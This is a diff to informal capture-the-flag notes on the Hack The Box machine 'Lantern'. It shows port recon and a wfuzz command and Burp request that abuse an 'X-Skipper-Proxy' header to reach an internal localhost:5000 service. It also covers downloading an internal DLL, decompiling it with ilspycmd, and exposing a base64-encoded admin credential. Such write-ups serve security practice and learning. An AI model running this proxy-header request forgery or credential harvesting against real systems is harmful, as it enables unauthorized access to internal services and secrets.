@@ -6,10 +6,12 @@
    
 ## Recon
 
-| PORT     | STATE | | SERVICE |
-| 22/tcp |   | open|  | ssh |
-| 80/tcp |  | open|  | http |
-| 3000/tcp | | open|  | ppp |
+```nmap
+|PORT|     |STATE| |SERVICE|
+|22/tcp|   |open|  |ssh|
+|80/tcp|  |open|  |http|
+|3000/tcp| |open|  |ppp|
+```
 
 >> We can Post a pdf or whatever if we modify the name of the file as .pdf 
 
@@ -63,6 +65,70 @@ So Im thinking that i could read the dlls through the port 5000 , since its not 
 
 It must have some intersting dll that I could decompile 
 
+We have a dll 
+dirbusting the port 5000
+wfuzz --hw 123 --hc 503 -c -z file,"/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt" -t 100  -H "X-Skipper-Proxy: http://localhost:5000" http://lantern.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://lantern.htb/FUZZ
+Total requests: 81643
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload        
+=====================================================================
+
+
+Total time: 0
+Processed Requests: 81643
+Filtered Requests: 81643
+Requests/sec.: 0
+
+
+```burpsuite
+
+GET /_framework/InternaLantern.dll HTTP/1.1
+Host: lantern.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-Skipper-Proxy:http://localhost:5000/
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+https://github.com/icsharpcode/ILSpy
+ilspycmd InternaLantern.dll -o source_code
+
+new Employee
+
+                                                {
+
+                                                        Uid = "POMBS",
+
+                                                        Name = "Travis",
+
+                                                        SecondName = "Duarte",
+
+                                                        BirthDay = new DateTime(1999, 7, 23).ToShortDateString(),
+
+                                                        JoinDate = new DateTime(2024, 1, 21).ToShortDateString(),
+
+                                                        Salary = 90000,
+
+                                                        InternalInfo = Encoding.UTF8.GetString(Convert.FromBase64String("U3lzdGVtIGFkbWluaXN0cmF0b3IsIEZpcnN0IGRheTogMjEvMS8yMDI0LCBJbml0aWFsIGNyZWRlbnRpYWxzIGFkbWluOkFKYkZBX1FAOTI1cDlhcCMyMi4gQXNrIHRvIGNoYW5nZSBhZnRlciBmaXJzdCBsb2dpbiE="))
+
+                                                }
+                                                
+                                                
+                                                
+
+
+
+when decompiled we can extract a base64 secret
 
 - [+] :	
    >>	
